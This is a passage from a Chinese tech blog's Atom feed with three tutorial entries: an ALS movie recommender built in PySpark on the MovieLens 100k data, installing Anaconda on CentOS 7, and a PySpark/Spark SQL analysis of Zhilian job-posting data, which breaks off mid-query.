    <content type="html"><![CDATA[<h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>推荐引擎是最常见的机器学习应用，我们可以在各大购物网站上看见这方面的应用。</p><p>Spark MLlib支持ALS（Alternating Least Squares）推荐算法，是机器学习的协同过滤推荐算法。机器学习的协同过滤推荐算法通过观察所有用户给产品的评价来推断每个用户的喜好，并向每个用户分别推荐多个合适的产品，也可以把某个产品推荐给多个用户。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nL2EwOWRjMTFjLTEzNzYtNDE2MC05MzUwLWExYmQ4MzYyZTliNi5wbmc?x-oss-process=image/format,png" alt="image"></p><h2 id="系统环境"><a href="#系统环境" class="headerlink" title="系统环境"></a>系统环境</h2><pre><code>Linux Centos7Python 3.7.3AnacondaSpark2.4.2IPython Notebook</code></pre><h2 id="任务步骤"><a href="#任务步骤" class="headerlink" title="任务步骤"></a>任务步骤</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ol><li>将hadoop相关服务打开</li></ol><p>在hadoop/sbin目录下<code>./start-all.sh</code></p><ol start="2"><li>启动mysql服务</li><li>将文件上传到hdfs中</li></ol><p>命令:<code>hadoop fs -put /ml-100k(ml-100k的目录) /</code></p><ol start="4"><li>开启PySpark</li></ol><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><h4 id="我们使用sc-textFile读取ml-100k"><a href="#我们使用sc-textFile读取ml-100k" class="headerlink" title="我们使用sc.textFile读取ml-100k"></a>我们使用sc.textFile读取ml-100k</h4><p>我们使用sc.textFile读取HDFS上的ml-100k数据集中的u.data，并且查看数据项数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rawUserData = sc.textFile(<span class="string">"hdfs://172.18.74.236:9000/ml-100k/u.data"</span>)  </span><br><span class="line">rawUserData.count()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjE1MjM2OTY1LzA?x-oss-process=image/format,png" alt></p><p>从以上运行结果中可以看到共有100000项评分数据。</p><h4 id="查看u-data第一项数据"><a href="#查看u-data第一项数据" class="headerlink" title="查看u.data第一项数据"></a>查看u.data第一项数据</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rawUserData.first()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjE1MzQ0NTM2LzA?x-oss-process=image/format,png" alt></p><p>以上4个字段分别是：用户id、项目id、评分、日期时间，\t为分隔符。</p><h4 id="导入Rating模块"><a href="#导入Rating模块" class="headerlink" title="导入Rating模块"></a>导入Rating模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyspark.mllib.recommendation <span class="keyword">import</span> Rating</span><br></pre></td></tr></table></figure><h4 id="读取rawUserData前三个字段，按照用户、产品、用户对此产品的评价来编写rawRatings"><a href="#读取rawUserData前三个字段，按照用户、产品、用户对此产品的评价来编写rawRatings" class="headerlink" title="读取rawUserData前三个字段，按照用户、产品、用户对此产品的评价来编写rawRatings"></a>读取rawUserData前三个字段，按照用户、产品、用户对此产品的评价来编写rawRatings</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rawRatings = rawUserData.map(<span class="keyword">lambda</span> line:line.split(<span class="string">"\t"</span>)[:<span class="number">3</span>])  </span><br><span class="line">rawRatings.take(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjE1NTAxMTI0LzA?x-oss-process=image/format,png" alt></p><p>以上程序显示了前5项rawRatings数据。上列命令的详细说明如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzAxLnBuZw?x-oss-process=image/format,png" alt="image"></p><h3 id="准备ALS训练数据"><a href="#准备ALS训练数据" class="headerlink" title="准备ALS训练数据"></a>准备ALS训练数据</h3><p>ALS训练数据格式是RatingRDD数据类型，Rating定义如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzAyLnBuZw?x-oss-process=image/format,png" alt="image"></p><h4 id="使用下列命令编写ratingsRDD"><a href="#使用下列命令编写ratingsRDD" class="headerlink" title="使用下列命令编写ratingsRDD"></a>使用下列命令编写ratingsRDD</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ratingsRDD = rawRatings.map(<span class="keyword">lambda</span> x:(x[<span class="number">0</span>],x[<span class="number">1</span>],x[<span class="number">2</span>]))  </span><br><span class="line">ratingsRDD.take(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjE1ODg0NTYwLzA?x-oss-process=image/format,png" alt></p><p>以上运行结果显示共有100000项评价</p><h4 id="查看不重复用户数"><a href="#查看不重复用户数" class="headerlink" title="查看不重复用户数"></a>查看不重复用户数</h4><p>x[0]是用户字段，可以先用<code>.map(lambdax:x[0])</code>转换为用户数据，再使用<code>.distinct()</code>筛选出不重复的数据，最后显示numUsers</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">numUsers = ratingsRDD.map(<span class="keyword">lambda</span> x:x[<span class="number">0</span>]).distinct().count()  </span><br><span class="line">numUsers</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTU2MzM2NjE3OV8xNTcwNjE3MzIwNDQ1LzA?x-oss-process=image/format,png" alt></p><p>以上运行结果显示共有943个不重复用户</p><h4 id="查看不重复电影数"><a href="#查看不重复电影数" class="headerlink" title="查看不重复电影数"></a>查看不重复电影数</h4><p>x[1]是电影字段，可以先使用<code>.map(lambda x:x[1])</code>转换为电影数据，再使用.distinct()筛选出不重复的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">numMovies = ratingsRDD.map(<span class="keyword">lambda</span> x:x[<span class="number">1</span>]).distinct().count()  </span><br><span class="line">numMovies</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMzY5NTc5NDQ2XzE1NzA2MTczODg1NjkvMA?x-oss-process=image/format,png" alt></p><h4 id="如何训练模型"><a href="#如何训练模型" class="headerlink" title="如何训练模型"></a>如何训练模型</h4><p>如图，我们将使用rawUserData数据以map转换为rawRatings，再改用map转换为ALS训练数据格式RDD[Rating]。然后使用ALS.train进行训练，训练完后就会创建推荐引擎模型MatrixFactorizationModel。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nL2YxNjRlNGJiLTA5MjQtNDQzNy1hZTM3LTAwYmIxZjI5MGI0ZS5wbmc?x-oss-process=image/format,png" alt="image"></p><h4 id="导入ALS模块"><a href="#导入ALS模块" class="headerlink" title="导入ALS模块"></a>导入ALS模块</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyspark.mllib.recommendation <span class="keyword">import</span> ALS</span><br></pre></td></tr></table></figure><h4 id="使用ALS-train介绍"><a href="#使用ALS-train介绍" class="headerlink" title="使用ALS.train介绍"></a>使用ALS.train介绍</h4><p>我们将使用ALS.train命令进行训练。ALS.train可分为显式评分与隐式评分训练。</p><h5 id="显式评分（Explicit-Rating）训练"><a href="#显式评分（Explicit-Rating）训练" class="headerlink" title="显式评分（Explicit Rating）训练"></a>显式评分（Explicit Rating）训练</h5><p><code>ALS.train(ratings,rank,iterations=5,lambda_=0.01):</code></p><p>返回:<code>MatrixFactorizationModel</code></p><p>隐式评分（Implicit Rating）训练</p><p><code>ALS.trainImplicit(ratings,rank,iterations=5,lambda_=0.01):</code></p><p>返回:<code>MatrixFactorizationModel</code></p><p>两种评分训练的作用都是训练数据并返回模型</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzAzLnBuZw?x-oss-process=image/format,png" alt="image"></p><p>我们可以使用ALS.train命令并传入之前创建的ratingsRDD进行训练，训练完成后返回model</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model = ALS.train(ratingsRDD,10,10,0.01)  </span><br><span class="line">print(model)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIwNDA4Mzc0LzA?x-oss-process=image/format,png" alt></p><h4 id="如何使用模型进行推荐"><a href="#如何使用模型进行推荐" class="headerlink" title="如何使用模型进行推荐"></a>如何使用模型进行推荐</h4><p>前面我们已经训练完成并建立了模型，接下来将使用此模型进行推荐</p><h4 id="针对用户推荐电影"><a href="#针对用户推荐电影" class="headerlink" title="针对用户推荐电影"></a>针对用户推荐电影</h4><p>我们可以针对每个会员定期发送消息，或在会员登录时向会员推送可能会感兴趣的电影。</p><p>针对用户推荐电影，我们可以使用<code>model.recommendProducts</code>方法来推荐，说明如下表所示</p><p><code>MatrixFactorizationModel.recommendProducts(user:Int,num:Int)：</code>输入参数user，针对此user推荐给他有可能感兴趣的产品。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIwNDYwOTA0LzA?x-oss-process=image/format,png" alt></p><p>使用训练完的模型，向用户100推荐他可能感兴趣的前5部电影，传入参数（user=100,num=5）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.recommendProducts(100,5)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIwNDk5MTIzLzA?x-oss-process=image/format,png" alt></p><p>以上执行结果显示，第1项数据是系统针对此用户首先推荐的产品，其意义是推荐给用户ID 100，产品ID1268，推荐评分大约为6.76，推荐评分越高，代表系统越优先推荐此产品</p><h4 id="查看针对用户推荐产品的评分"><a href="#查看针对用户推荐产品的评分" class="headerlink" title="查看针对用户推荐产品的评分"></a>查看针对用户推荐产品的评分</h4><p>我们可以查询系统对用户推荐产品的评分。例如，我们查询上一步骤的第一项，系统针对用户100推荐产品1141的评分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.predict(100,1141)</span><br></pre></td></tr></table></figure><p>参数说明：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzA1LnBuZw?x-oss-process=image/format,png" alt="image"></p><p>使用训练完的模型，推荐对电影200感兴趣的前5个用户，传入参数（produce=200,num=5）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.recommendUsers(product=200,num=5)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIwNjU0MTI1LzA?x-oss-process=image/format,png" alt></p><p>以上运行结果显示，第一项数据是系统针对电影推荐给用户。其意思是针对电影ID200推荐给用户ID818，推荐评分大约为7.4</p><h4 id="显示推荐的电影名称"><a href="#显示推荐的电影名称" class="headerlink" title="显示推荐的电影名称"></a>显示推荐的电影名称</h4><p>之前的例子只显示推荐电影的ID，下面我们使用u.item数据显示推荐电影的名称</p><p>使用sc.textFile将u.item文本文件导入itemRDD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">itemRDD = sc.textFile(&quot;hdfs://172.18.74.236:9000/ml-100k/u.item&quot;)  </span><br><span class="line">itemRDD.count()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIwODA0MjAwLzA?x-oss-process=image/format,png" alt></p><h4 id="为了显式推荐电影的名称，我们创建“电影ID与名称”的字典"><a href="#为了显式推荐电影的名称，我们创建“电影ID与名称”的字典" class="headerlink" title="为了显式推荐电影的名称，我们创建“电影ID与名称”的字典"></a>为了显式推荐电影的名称，我们创建“电影ID与名称”的字典</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movieTitle=itemRDD.map(lambda line:line.split(&quot;|&quot;)).map(lambda a:(float(a[0]),a[1])).collectAsMap()  </span><br><span class="line">len(movieTitle)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIxMjM0MDQ4LzA?x-oss-process=image/format,png" alt><br>以上结果显示“电影ID与名称“字典共计1682项。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci8zYTkzY2Q4Yy05MWFkLTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzA2LnBuZw?x-oss-process=image/format,png" alt="image"></p><h4 id="针对用户100推荐5部可能感兴趣的电影"><a href="#针对用户100推荐5部可能感兴趣的电影" class="headerlink" title="针对用户100推荐5部可能感兴趣的电影"></a>针对用户100推荐5部可能感兴趣的电影</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">recommendP = model.recommendProducts(100,5)  </span><br><span class="line">for p in recommendP:  </span><br><span class="line">    print(&quot;对用户：&quot;+str(p[0])+&quot;，推荐电影：&quot;+str(movieTitle[p[1]])+&quot;，推荐评分：&quot;+str(p[2]))</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjIxMjk3MzU1LzA?x-oss-process=image/format,png" alt></p><p>参考网站: 章鱼大数据</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;相关知识&quot;&gt;&lt;a href=&quot;#相关知识&quot; class=&quot;headerlink&quot; title=&quot;相关知识&quot;&gt;&lt;/a&gt;相关知识&lt;/h2&gt;&lt;p&gt;推荐引擎是最常见的机器学习应用，我们可以在各大购物网站上看见这方面的应用。&lt;/p&gt;
&lt;p&gt;Spark MLlib支持ALS（
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="PySpark" scheme="https://plutoacharon.github.io/tags/PySpark/"/>
    
  </entry>
  
  <entry>
    <title>Centos7安装Anaconda详细版</title>
    <link href="https://plutoacharon.github.io/2019/10/10/Centos7%E5%AE%89%E8%A3%85Anaconda%E8%AF%A6%E7%BB%86%E7%89%88/"/>
    <id>https://plutoacharon.github.io/2019/10/10/Centos7安装Anaconda详细版/</id>
    <published>2019-10-10T14:12:07.000Z</published>
    <updated>2019-10-10T14:12:33.226Z</updated>
    
    <content type="html"><![CDATA[<h2 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h2><blockquote><p>centos7</p></blockquote><h2 id="Anaconda版本"><a href="#Anaconda版本" class="headerlink" title="Anaconda版本"></a>Anaconda版本</h2><blockquote><p>Anaconda3-2019.07-Linux-x86_64.sh</p></blockquote><p><a href="https://www.anaconda.com/distribution/" target="_blank" rel="noopener">下载地址</a></p><h2 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>打开Anaconda下载地址,复制下载链接,在centos7中使用wget下载,也可以在本地下载完上传到Centos中</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjEzNDUzODQ2LzA?x-oss-process=image/format,png" alt></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在命令行运行<code>bash Anaconda3-2019.07-Linux-x86_64.sh</code></p><p>按照提示输入yes与按回车键</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjEzNTQ3MDY0LzA?x-oss-process=image/format,png" alt></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>安装完anaconda，修改~/.bash_profile文件，添加anaconda的bin目录到PATH中（如果最后一个提示你yes/no，选择yes就不需要更改</p><p>如果选择了no,那么打开<code>~/.bashrc</code>文件</p><p>添加<code>export PATH=/root/anaconda3/bin:$PATH</code></p><p>然后在命令行执行<code>source ~/.bashrc</code></p><h2 id="验证环境"><a href="#验证环境" class="headerlink" title="验证环境"></a>验证环境</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTY4MDE4NzMxOF8xNTcwNjEzODE3ODI0LzA?x-oss-process=image/format,png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;操作环境&quot;&gt;&lt;a href=&quot;#操作环境&quot; class=&quot;headerlink&quot; title=&quot;操作环境&quot;&gt;&lt;/a&gt;操作环境&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;centos7&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;Anaconda版本&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>使用PySpark对招聘信息数据进行分析</title>
    <link href="https://plutoacharon.github.io/2019/10/10/%E4%BD%BF%E7%94%A8PySpark%E5%AF%B9%E6%8B%9B%E8%81%98%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90/"/>
    <id>https://plutoacharon.github.io/2019/10/10/使用PySpark对招聘信息数据进行分析/</id>
    <published>2019-10-10T14:11:10.000Z</published>
    <updated>2019-10-10T14:11:42.163Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用PySpark对智联数据进行分析"><a href="#使用PySpark对智联数据进行分析" class="headerlink" title="使用PySpark对智联数据进行分析"></a>使用PySpark对智联数据进行分析</h2><h3 id="Spark数据处理方式主要有三种：RDD、DataFrame、Spark-SQL"><a href="#Spark数据处理方式主要有三种：RDD、DataFrame、Spark-SQL" class="headerlink" title="Spark数据处理方式主要有三种：RDD、DataFrame、Spark SQL"></a>Spark数据处理方式主要有三种：RDD、DataFrame、Spark SQL</h3><p>三者的主要差异在于是否定义<code>Schema</code></p><ul><li><p>RDD的数据未定义Schema（也就是未定义字段名及数据类型）。使用上必须有Map/Reduce的概念，需要高级别的程序设计能力。但是功能也最强，能完成所有Spark功能。</p></li><li><p>Spark DataFrame建立时必须定义Schema（定义每一个字段名与数据类型）</p></li><li><p>Spark SQL是由DataFrame衍生出来的，我们必须先建立DataFrame，然后通过登录Spark SQL temp table，就可以使用Spark SQL语法了。</p></li><li>易使用度：Spark SQL&gt;DataFrame&gt;RDD</li></ul><p>DataFrame与SparkSQL比RDD更快速</p><p>DataFrame与Spark SQL通过Catalyst进行最优化，可以大幅提高执行效率。Python语言特性使其使用RDD时执行速度比Scala慢，但是Spark Python使用DataFrame时，执行性能几乎与Spark Scala使用DataFrame相同，而且使用DataFrames时，无论是Python还是Scala，运行时间都明显比使用RDD少很多。</p><h2 id="任务内容"><a href="#任务内容" class="headerlink" title="任务内容"></a>任务内容</h2><pre><code>练习Spark RDD、DataFrame、SparkSQL的创建方式及使用方法利用DataFrame统计公司性质及数量利用Spark SQL统计经验要求及数量利用Spark SQL统计公司规模及数量</code></pre><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><ol><li>将hadoop相关服务打开</li></ol><p>在hadoop/sbin目录下<code>./start-all.sh</code></p><ol start="2"><li>启动mysql服务</li><li>将文件上传到hdfs中</li></ol><p>命令:<code>hadoop fs -put /bigdata(bigdata的目录) /</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTI2MDcxMzIvMA?x-oss-process=image/format,png" alt></p><ol start="4"><li>开启PySpark</li></ol><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><ol><li>创建RDD</li></ol><p>使用textFile()方法读取HDFS上的bigdata文件，赋值给RDD1并统计文件内容有多少行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RDD1 = sc.textFile(&quot;/bigdata&quot;)  </span><br><span class="line">RDD1.count()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTIzMTgyNjY5NF8xNTcwNTkyNzE0NDA1LzA?x-oss-process=image/format,png" alt></p><p>使用map函数处理每一项数据，用lambda语句创建匿名函数传入line参数，在匿名函数中，line.split(“,”)表示按照逗号分隔获取每一个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDD2=RDD1.map(lambda line:line.split(&quot;,&quot;))</span><br></pre></td></tr></table></figure><ol start="2"><li>创建DataFrame</li></ol><p>导入row模块，通过RDD2创建DataFrame，定义DataFrame的每一个字段名与数据类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pyspark.sql import Row  </span><br><span class="line">zhilian_Rows = RDD2.map(lambda p:  </span><br><span class="line">Row(  </span><br><span class="line">num_people=p[0],  </span><br><span class="line">Company_name=p[1],  </span><br><span class="line">Company_address=p[2],  </span><br><span class="line">Company_Type=p[3],  </span><br><span class="line">Company_website=p[4],  </span><br><span class="line">Industry=p[5],  </span><br><span class="line">Company_Size=p[6],  </span><br><span class="line">Release_date=p[7],  </span><br><span class="line">Job_name=p[8],  </span><br><span class="line">work_place=p[9],  </span><br><span class="line">Nature_of_the_work=p[10],  </span><br><span class="line">Minimum_education=p[11],  </span><br><span class="line">Monthly_salary=p[12],  </span><br><span class="line">Welfare=p[13],  </span><br><span class="line">Experience=p[14],  </span><br><span class="line">Job_Categories=p[15]  </span><br><span class="line">)  </span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>字段解释:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuaXBpZXV2cmUuY29tL2RvYy9leHBlci9kMzEyOGU5NS1hY2Y5LTExZTktYmVlYi0wMDIxNWVjODkyZjQvaW1nLzBiOGQ0Y2Y5LTlhNzctNGQ1Zi1hODFiLWJhZjIzYWVlODg3ZC5wbmc?x-oss-process=image/format,png" alt="image"></p><p>创建了<code>zhilian_Rows</code>之后，使用<code>sqlContext.createDataFrame()</code>方法写入<code>zhilian_Rows</code>数据，创建<code>DataFrame</code>，然后使用<code>.printSchema()</code>方法查看<code>DataFrames</code>的<code>Schema</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pyspark.sql import SQLContext  </span><br><span class="line">sqlContext = SQLContext(sc)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zhilian_df = sqlContext.createDataFrame(zhilian_Rows)  </span><br><span class="line">zhilian_df.printSchema()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTMyNDIxNjAvMA?x-oss-process=image/format,png" alt></p><p>接下来，我们可以使用.show()方法来查看前5行数据</p><p><code>zhilian_df.show(5)</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTMzNDM5NzQvMA?x-oss-process=image/format,png" alt></p><p>我们也可以使用.alias()方法来为DadaFrame创建别名，例如zhilian_df.alias(“df”)，后续我们就可以使用这个别名执行命令了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df=zhilian_df.alias(&quot;df&quot;)  </span><br><span class="line">df.show(5)</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTM0NDQ2NjcvMA?x-oss-process=image/format,png" alt></p><p>使用DataFrame统计公司性质及数量</p><p><code>df.select(&quot;Company_Type&quot;).groupby(&quot;Company_Type&quot;).count().show()</code></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfOTE2NjY2OTg4XzE1NzA1OTM1MjMyMDEvMA?x-oss-process=image/format,png" alt></p><ol start="3"><li>创建PySpark SQL</li></ol><p>我们之前创建DataFrame，下面我们使用registerTempTable方法将df转换为zhilian_table表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlContext.registerDataFrameAsTable(df, &quot;zhilian_table&quot;)</span><br></pre></td></tr></table></figure><p>接下来，我们可以使用sqlContext.sql()输入sql语句，使用select关键字查询文件内容行数，并使用from关键字指定要查询的表，最后使用show()方法显示查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlContext.sql(&quot;select count(*) counts from zhilian_table&quot;).show()</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wdXVpLnFwaWMuY24vZmFuc19hZG1pbi8wLzNfMTQwOTA3NTY4M18xNTcwNTkzNzcwMjQ0LzA?x-oss-process=image/format,png" alt></p><p>使用PySpark SQL统计经验要求及数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Company_Type_df=sqlContext.sql(&quot;&quot;&quot;  </span><br><span class="line">select distinct  </span><br><span class="line">z.Experience,count(*) counts   </span><br><span class="line">from   </span><br><span class="line">zhilian_table z   </span><br><span 